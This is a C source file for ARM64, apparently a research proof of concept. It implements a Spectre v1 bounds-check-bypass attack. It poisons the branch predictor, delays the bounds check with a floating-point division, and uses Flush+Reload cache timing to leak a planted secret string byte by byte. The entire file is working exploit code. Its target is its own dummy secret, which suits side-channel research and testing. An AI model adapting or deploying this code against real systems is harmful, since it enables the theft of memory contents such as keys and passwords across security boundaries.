#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include "utils.h"

#define STRIDE 4096
#define RELOAD_BUF_SIZE STRIDE * 256
#define ITER 400

#define MOV(n)	\
	asm volatile(	\
		".rept %0\n" \
		"mov x10, x10\n" \
		".endr\n"	\
		::"i" (n): "x10" \
	)

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define ADDS(n) \
    asm volatile( \
        ".rept %0\n" \
        "adds x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define REPEAT_16(x)  x x x x x x x x x x x x x x x
#define REPEAT_8(x)  x x x x x x x x

static unsigned char size = 16;
static unsigned char *size_ptr = &size;
static unsigned char **size_ptr_ptr= &size_ptr;
static unsigned char ***size_ptr_ptr_ptr= &size_ptr_ptr;
static unsigned int cachemiss __attribute__((aligned(4096))) = 16;
uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t *reloadbuffer;
char *secret = "123457812345678";
static volatile uint8_t pick = 0; 
uint64_t dummy[100] = {0};
double num = 3.1415926;
double divi = 1.1234567;

/*
 * Measure the latency: check whether dco kicks in
 */
static inline __attribute__((always_inline)) void measure_time() {
	uint64_t init;
	uint64_t end;
	volatile uint64_t pick;
	asm volatile(
	"ldr x1, %[val]\n"
	:
	:[val] "m" (pick)
	: "x1"
	);
	for(volatile int z = 0; z < 100; z++){}
	isb();

	init = get_cycles();
	MOV(200);
	asm volatile(
	"adds x1, x1, #1\n"
	::: "x1"
	);
	end = get_cycles();
	isb();

	asm volatile(
	"str x1, %[val]\n"
	:
	: [val] "m" (pick)
	: "x1"
	);
	        printf("%ld\n", end - init);
	}


static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
	//size[0] = 0;
	//pick = size[0];
	unsigned char branch = 16;
	pick = *size_ptr;
	isb();
	asm volatile(
		"ldr d0, %[num]\n\r"
		"ldr d1, %[div]\n\r"
		"mov x10, #0\n\r"
		::[num] "m" (num), [div] "m" (divi)
		:"d0", "d1", "x10", "memory"
	);
	pick = cachemiss;
	//size[0] = 0;
	//size = 16;
	/*
	 * Spectre v1 runahead
	 */
	//branch = **size_ptr_ptr;
	asm volatile (
    	"mov x0, %0\n\r"  
		"fdiv d0, d0, d1\n\r"
		"fcvtzs x2, d0\n\r"
		"mul x2, x2, x10\n\r"
//		"mov x2, #0\n\r"
		"adds x0, x0, x2\n\r"
//		"ldr x0, [x0]\n\r"
//		"mov x10, x10\n\r"
//		"ldr x0, [x0]\n\r"
//		"mov x10, x10\n\r"
		"ldr %0, [x0]\n\r"
    	: "=r" (branch)
    	: "r" (&size) 
    	: "x0"                
	);
	if (index < branch)
	{	
		MOV(20);
		pick = reloadbuffer[fake_buffer[index] << 12];
	}
	//measure_time();
}


static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *byte) {
	int index, max = 0;
	size_t train_index, probe_addr;
	int results[256];
	int hit = 0;
	int random_int;
	uint64_t init, end;
	
	memset(results, 0 , sizeof(int) * 256);
	REPEAT_16(
	for (int tries = ITER / 8; tries > 0; tries--) {

		/*
		 * flush reload buffer
		 */
		for (int i = 0; i < 256; i++)
			cacheflush(&reloadbuffer[i * STRIDE]); 

		train_index = tries % 16;
		for (int j = 0; j <= 10; j++) {

			/*
			 *poison branch predictor
			 */
			random_int = random(5, 9);
			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
			probe_addr = (probe_addr | (probe_addr >> 8)); 
			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
//			cacheflush(&size);
			cacheflush(&cachemiss);
			//for(volatile int z = 0; z < 100; z++){}
			isb();
	//		pick = data;
			spectre_v1(probe_addr);
		}
		
		/*
		 * reload reload buffer 
		 */
		for (int i = 0; i < 256; i++)
		{
			index = ((i * 167) + 13) & 255;  // mixed access order

			isb();
			init = get_cycles();
			pick = reloadbuffer[index * STRIDE];
			end = get_cycles();
			isb();
			if (end - init <= 190 && index != fake_buffer[tries % 16])
				results[index]++; 
		}

	}
	);

	max = results[0];
	for(int m = 0; m < 256; m++){
		if(results[m] > max){
			max = results[m];
			hit = m;
		}
	}
	printf("cache hit: %c, %x, hitrate: %f\n", (uint8_t)hit, hit, (double)results[hit] / 800);
	*byte = (uint8_t)hit;
}

int main(int argc, const char * * argv) {
	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	//size = (unsigned char *)mmap(0, 10, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	//size = (unsigned char *)malloc(10);
	size_t offset = (size_t)(secret - (char *)fake_buffer);
	int secret_len = strlen(secret);
	uint8_t byte;
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
	//memset(size, 0x10, 10);

	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);


//	for(int i = 0; i < secret_len; i++)
//	{
//		leak(offset + i, &byte);
//		leaked[i] = byte;
//	}
	
	/*
	 * Repeat 16 times, avoid using loops
	 */
	int i =  0;
	REPEAT_16(
		leak(offset + i, &byte);
		leaked[i] = byte;
		i = i + 1;		
	);

	for(int i = 0; i < secret_len; i++){
		printf("%c", leaked[i]);
	}
	printf("\n");
	
	int correct = 0;
	for(int i = 0; i < 16; i++){
		if(leaked[i] == secret[i]){
			correct ++;
		}
	}

	//printf("%d\n", correct);
	free(leaked);
	leaked = NULL;
	return 0;
}

